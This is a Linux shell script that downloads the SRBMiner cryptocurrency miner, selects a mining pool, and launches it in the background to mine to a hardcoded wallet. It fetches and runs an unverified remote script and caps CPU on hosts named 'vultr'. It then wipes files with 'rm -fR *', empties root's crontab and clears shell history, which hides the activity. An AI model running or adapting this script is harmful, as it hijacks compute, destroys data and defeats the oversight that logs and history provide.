#!/bin/sh
password="danielchau@123#"
hostname=$(hostname)
rm -fR /root/cpuminer-opt-linux/
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz
tar -xvf SRBMiner-Multi.tar.gz
chmod +x SRBMiner-Multi-2-4-6/*
mv /root/SRBMiner-Multi-2-4-6/SRBMiner-MULTI /root/SRBMiner-MULTI
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

#find best servers
servers=("de.mining4people.com" "na.mining4people.com" "sg.mining4people.com")
fastest_server="de.mining4people.com"
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
sudo ./kill_miner.sh
sleep 5
sudo ./SRBMiner-MULTI --background -t $cores --algorithm aurum --pool $fastest_server:23442 --tls true --wallet bit1q7r28teaef98nu7u8gwgekskrlaaga5w2qsl9e0.$hostname > /dev/null 2>&1 &
sleep 3
EOF

chmod +x /root/danielluis1921.sh

if [ "$hostname" = "vultr" ];
then
  sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof SRBMiner-MULTI) > /dev/null 2>&1 &" danielluis1921.sh
  sed -i 's/Linode/Vultr/g' danielluis1921.sh
else
  echo "hostname isn't vultr"
fi

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./root/kill_miner.sh
sleep 3
./danielluis1921.sh
cat /dev/null > /var/spool/cron/crontabs/root
rm -fv *
rm -fR *
history -c && history -w
